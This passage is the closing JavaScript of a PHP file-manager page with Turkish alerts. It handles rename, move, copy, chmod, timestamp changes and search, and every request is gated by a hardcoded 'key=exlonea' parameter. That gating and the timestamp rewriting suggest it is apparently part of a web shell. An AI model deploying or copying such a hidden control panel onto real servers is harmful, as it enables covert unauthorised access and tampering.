            });
            document.body.appendChild(form);
            form.submit();
        }
        function setRenameFile() {
            if (selectedFiles.length !== 1) {
                alert('Lütfen bir dosya veya klasör seçin!');
                return;
            }
            document.getElementById('renameOldName').value = selectedFiles[0];
            document.getElementById('new_name').value = selectedFiles[0];
        }
        function setMoveFile() {
            if (selectedFiles.length !== 1) {
                alert('Lütfen bir dosya veya klasör seçin!');
                return;
            }
            document.getElementById('moveFile').value = selectedFiles[0];
        }
        function setCopyFile() {
            if (selectedFiles.length !== 1) {
                alert('Lütfen bir dosya veya klasör seçin!');
                return;
            }
            document.getElementById('copyFile').value = selectedFiles[0];
        }
        function setChmodFile() {
            if (selectedFiles.length !== 1) {
                alert('Lütfen bir dosya veya klasör seçin!');
                return;
            }
            document.getElementById('chmodFile').value = selectedFiles[0];
            document.getElementById('permissions').value = '';
        }
        function setMtimeFile() {
            if (selectedFiles.length !== 1) {
                alert('Lütfen bir dosya veya klasör seçin!');
                return;
            }
            document.getElementById('mtimeFile').value = selectedFiles[0];
            document.getElementById('mtime').value = '';
        }
        function toggleFileSelection() {
            const selectFile = document.getElementById('selectFile').checked;
            document.querySelectorAll('input[name="file[]"]').forEach(checkbox => {
                checkbox.checked = selectFile;
            });
            updateFileSelection();
        }
        document.getElementById('searchInput').addEventListener('input', function() {
            const query = this.value;
            if (query.length === 0) {
                fetch(`?dir=<?php echo urlencode($currentDir); ?>&key=exlonea`)
                    .then(response => response.text())
                    .then(data => {
                        const parser = new DOMParser();
                        const doc = parser.parseFromString(data, 'text/html');
                        document.getElementById('fileList').innerHTML = doc.querySelector('#fileList').innerHTML;
                    });
                return;
            }
            fetch(`?action=search&dir=<?php echo urlencode($currentDir); ?>&query=${encodeURIComponent(query)}&key=exlonea`)
                .then(response => response.text())
                .then(data => {
                    const parser = new DOMParser();
                    doc = parser.parseFromString(data, 'text/html');
                    document.getElementById('fileList').innerHTML = doc.querySelector('#fileList').innerHTML;
                });
        });
        updateFileSelection();
    </script>
</body>
</html>